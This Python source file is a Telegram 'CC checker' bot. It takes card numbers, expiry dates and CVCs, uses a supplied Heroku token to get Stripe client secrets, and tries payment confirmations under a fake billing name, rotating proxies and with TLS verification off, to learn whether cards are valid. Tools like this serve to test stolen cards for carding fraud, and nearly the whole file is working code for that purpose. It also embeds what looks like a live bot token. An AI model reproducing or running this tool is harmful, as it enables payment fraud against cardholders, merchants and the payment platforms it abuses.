from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import requests
import random

bot_token = '7801446284:AAEVqjQPWl6a0NXXCAGdfl6Mw-Fg0PXmB8U'
owner_id = 6663845789
user_ids = [6663845789,6698364560]
use_proxy = False
proxies = []

def toggle_proxy():
    global use_proxy, proxies
    if use_proxy:
        use_proxy = False
        proxies = []
        return "Proxy disabled."
    else:
        proxies = ["your_proxies_here"]
        use_proxy = True
        return "Proxy enabled."

def parse_proxy(proxy):
    parts = proxy.split(':')
    if len(parts) == 4:
        domain, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{domain}:{port}',
            'https': f'http://{username}:{password}@{domain}:{port}'
        }
    else:
        return None
        
def check_card(card_details, heroku_auth_key):
    try:
        cc, month, year, cvc = card_details.split('|')
        print(f"Processing card: {cc} with expiry {month}/{year}...")

        heroku_token_url = 'https://api.heroku.com/account/payment-method/client-token'
        heroku_headers = {
            'Authorization': f'Bearer {heroku_auth_key}',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/vnd.heroku+json; version=3'
        }

        heroku_token_response = requests.post(heroku_token_url, headers=heroku_headers)
        heroku_token_data = heroku_token_response.json()
        token = heroku_token_data.get('token')

        if not token:
            return "Failed to retrieve Heroku token"

        token_first_part = token.split('_secret_')[0]

        post_data = {
            'type': 'card',
            'billing_details[name]': 'Julie Herrera',
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year
        }

        stripe_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }

        first_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=post_data)
        first_response_data = first_response.json()
        payment_method_id = first_response_data.get('id')

        if payment_method_id:
            second_post_data = {
                'payment_method': payment_method_id,
                'key': 'pk_live_your_public_key',
                'client_secret': token
            }

            proxy_dict = None
            if use_proxy and proxies:
                proxy = random.choice(proxies)
                proxy_dict = parse_proxy(proxy)

            second_response = requests.post(
                f'https://api.stripe.com/v1/payment_intents/{token_first_part}/confirm',
                headers=stripe_headers, data=second_post_data, proxies=proxy_dict, verify=False
            )

            response_code = second_response.status_code
            response_body = second_response.json()

            if response_code == 402:
                return f"Error: {response_body.get('error', {}).get('message', 'Unknown error')}"
            elif response_code == 200 and response_body.get('status') == 'succeeded':
                return "Charged successfully!"
            else:
                return f"Failed with status: {response_code}"
        else:
            return "Failed to retrieve payment method ID"
    except Exception as e:
        return f"Card check failed: {str(e)}"

def start(update: Update, context: CallbackContext):
    keyboard = [
        [
            InlineKeyboardButton("Proxy Toggle", callback_data='toggle_proxy'),
            InlineKeyboardButton("Add User", callback_data='add_user')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('CC Checker Bot by Alcyone for Heroku and Stripe', reply_markup=reply_markup)

def button(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    if query.data == 'toggle_proxy':
        result = toggle_proxy()
        query.edit_message_text(text=result)

    elif query.data == 'add_user':
        if str(query.from_user.id) == str(owner_id):
            context.bot.send_message(chat_id=query.message.chat_id, text="Please provide the user ID to add.")
            context.user_data['awaiting_user_id'] = True
        else:
            context.bot.send_message(chat_id=query.message.chat_id, text="You are not authorized to add users.")

def process_add_user(update: Update, context: CallbackContext):
    if context.user_data.get('awaiting_user_id'):
        user_id = update.message.text
        if user_id not in user_ids:
            user_ids.append(user_id)
            update.message.reply_text(f"User ID {user_id} added successfully!")
        else:
            update.message.reply_text(f"User ID {user_id} is already in the list.")
        context.user_data['awaiting_user_id'] = False

def check_card_command(update: Update, context: CallbackContext):
    update.message.reply_text("Please send card details in format: CC|MM|YY|CVC")
    context.user_data['awaiting_card_details'] = True

def process_card_details(update: Update, context: CallbackContext):
    if context.user_data.get('awaiting_card_details'):
        card_details = update.message.text
        context.user_data['card_details'] = card_details
        update.message.reply_text("Please provide your Heroku auth token.")
        context.user_data['awaiting_card_details'] = False
        context.user_data['awaiting_heroku_token'] = True

def process_heroku_token(update: Update, context: CallbackContext):
    if context.user_data.get('awaiting_heroku_token'):
        heroku_auth_key = update.message.text
        card_details = context.user_data.get('card_details')
        response = check_card(card_details, heroku_auth_key)
        update.message.reply_text(response)
        context.user_data['awaiting_heroku_token'] = False

def main():
    updater = Updater(bot_token, use_context=True)

    dp = updater.dispatcher

    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & Filters.regex(r'^\d{16}\|\d{2}\|\d{2}\|\d{3}$'), process_card_details))
    dp.add_handler(MessageHandler(Filters.text & Filters.regex(r'^sk_live.*$'), process_heroku_token))
    dp.add_handler(MessageHandler(Filters.text, process_add_user))  # Handle adding user and token check
    
    dp.add_handler(CommandHandler('check', check_card_command))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
